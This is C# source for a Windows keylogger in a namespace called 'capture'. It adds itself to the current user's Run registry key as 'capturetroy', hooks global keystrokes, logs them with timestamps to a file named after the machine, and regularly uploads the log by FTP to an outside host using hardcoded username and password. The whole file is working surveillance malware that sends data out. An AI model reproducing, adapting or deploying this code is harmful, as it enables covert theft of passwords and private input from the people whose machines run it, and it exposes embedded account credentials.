﻿using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Text;
using System.Windows.Forms;
using Gma.UserActivityMonitor;
using System.IO;
using System.Net;
using System.Net.NetworkInformation;
using Microsoft.Win32;
namespace capture
{
    enum Tick:int{
        OFF=60000, ON=300000
    }
    
    public partial class Form1 : Form
    {
        RegistryKey reg = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
        public Form1()
        {
            reg.SetValue("capturetroy", Application.ExecutablePath.ToString());
            
            InitializeComponent();


        }
        string line="";
        string file = "";
        string destination = "";
        bool connected = false;
        private void Form1_Load(object sender, EventArgs e)
        {
            this.WindowState = FormWindowState.Minimized;
            notifyIcon1.Visible = true;
            HookManager.KeyDown += HookManager_KeyDown;
            HookManager.KeyPress += HookManager_KeyPress;
            GoConnection();
        }
        void GoConnection() {
            if (!NetworkInterface.GetIsNetworkAvailable())
            {
                //MessageBox.Show("No");
                timer1.Interval = (int)Tick.OFF;
                timer1.Start();
          
            }
            else {
                connected = true;
                timer1.Interval =(int) Tick.ON;
                Config();
                timer1.Start();
              
            }

        }
        private void Config()
        {
           // HookManager.KeyPress += HookManager_KeyPress;
            //HookManager.MouseDown += HookManager_MouseDown;
            destination = "ftp://baotroy.site40.net/public_html";
            file = System.Environment.MachineName.ToString() + ".txt";
            string extention = Path.GetExtension(file);
            string fileName = file.Remove(file.Length - extention.Length);
            string fileNameCopy = fileName;
            if (File.Exists(file))
            {
                FileInfo fileLength = new FileInfo(file);
                if (fileLength.Length <= 1000000)
                    UploadFile();
                else
                {
                    using (FileStream fs = File.Create(file))
                    {
                        Byte[] info = new UTF8Encoding(true).GetBytes("File created on " + DateTime.Now.ToString() + " at " + System.Environment.MachineName.ToString());

                        fs.Write(info, 0, info.Length);
                        fs.Close();
                    }
                    UploadFile();
                }
            }
            else
            {
                using (FileStream fs = File.Create(file))
                {
                    Byte[] info = new UTF8Encoding(true).GetBytes("File created on " + DateTime.Now.ToString() + " at " + System.Environment.MachineName.ToString());

                    fs.Write(info, 0, info.Length);
                    fs.Close();
                }
                UploadFile();
            }
        }
        private void HookManager_KeyDown(object sender, KeyEventArgs e) {
           
        }
        private void HookManager_KeyPress(object sender, KeyPressEventArgs e)
        {
           if ((int)e.KeyChar != 8 && (int)e.KeyChar != 9 && (int)e.KeyChar != 13 && (int)e.KeyChar != 27)
                line += e.KeyChar.ToString();
            else
            {
                Write();
                Press_Control(e.KeyChar);
                Write();
                AppendFile();
            }
        }

        private void Press_Control(char c) {
            switch ((int)c) {
                case 8:
                    line +=(string.Format("KeyPress - {0}\n"," Backspace"));
                    break;
                case 9:
                    line += (string.Format("KeyPress - {0}\n", " Tab"));
                    break;
                case 13:
                    line += (string.Format("KeyPress - {0}\n", " Enter"));
                    break;
                case 27:
                    line += (string.Format("KeyPress - {0}\n", " Esc"));
                    break;
            }
        }
        private void HookManager_MouseClick(object sender, MouseEventArgs e)
        {
        }
        private void HookManager_MouseDown(object sender, MouseEventArgs e)
        {
            Write();
        }

        private void Write() {
            if (line != "")
            {
                line += "\n";
              
               // AppendFile();
                //line = "";
            }
        }

    
        private static FtpWebRequest GetRequest(string uriString)
        {
            var request = (FtpWebRequest)WebRequest.Create(uriString);
            request.Credentials = new NetworkCredential("a1320177", "baotran90");
            request.Method = WebRequestMethods.Ftp.GetFileSize;
            return request;
        }

        private static bool CheckFileExists(FtpWebRequest request)
        {
            try
            {
                FtpWebResponse response = (FtpWebResponse)request.GetResponse();

                return true;
            }
            catch (WebException ex)
            {
                FtpWebResponse response = (FtpWebResponse)ex.Response;
                if (response.StatusCode == FtpStatusCode.ActionNotTakenFileUnavailable)
                {
                    return false;
                }
                else
                {
                    return false;
                }
            }
        }
        private void UploadFile() {  
            string ftpServerIP = destination;
            string ftpUserName = "a1320177";
            string ftpPassword = "baotran90";

            FileInfo objFile = new FileInfo(file);
            FtpWebRequest objFTPRequest;

            // Create FtpWebRequest object 
            objFTPRequest = (FtpWebRequest)FtpWebRequest.Create(new Uri(ftpServerIP + "/" + objFile.Name));
            objFTPRequest.Credentials = new NetworkCredential(ftpUserName, ftpPassword);

            // By default KeepAlive is true, where the control connection is 
            // not closed after a command is executed.
            objFTPRequest.KeepAlive = false;

            // Set the data transfer type.
            objFTPRequest.UseBinary = true;

            // Set content length
            objFTPRequest.ContentLength = objFile.Length;

            // Set request method
            objFTPRequest.Method = WebRequestMethods.Ftp.UploadFile;

            // Set buffer size
            int intBufferLength = 16 * 1024;
            byte[] objBuffer = new byte[intBufferLength];

            // Opens a file to read
            FileStream objFileStream = objFile.OpenRead();

            try
            {
                // Get Stream of the file
                Stream objStream = objFTPRequest.GetRequestStream();

                int len = 0;

                while ((len = objFileStream.Read(objBuffer, 0, intBufferLength)) != 0)
                {
                    // Write file Content 
                    objStream.Write(objBuffer, 0, len);

                }

                objStream.Close();
                objFileStream.Close();
              
            }
            catch (Exception ex)
            {
                //throw ex;
            }

        }
        private void AppendFile() {
            //try
            {
                using (StreamWriter sw = File.AppendText(file))
                {
                    line = DateTime.Now.ToString() + "\n" + line;
                    sw.WriteLine(line);
                    sw.Close();
                    line = "";
                }
            }
            //catch (IOException ex)
            //{

            //}
        }
        int time = 0;
        
        private void timer1_Tick(object sender, EventArgs e)
        {
            if (connected)
            {
                MessageBox.Show(line);

                AppendFile();
                if (time < 3)
                {
                    time++;
                }
                else {
                    time = 0;
                    UploadFile();
                }
            }
            else
                GoConnection();
        }

        private void notifyIcon1_MouseDoubleClick(object sender, MouseEventArgs e)
        {
            HookManager.KeyPress -= HookManager_KeyPress;
            frmClose f = new frmClose();
            f.ShowDialog();
            HookManager.KeyPress += HookManager_KeyPress;
        }
    }
}
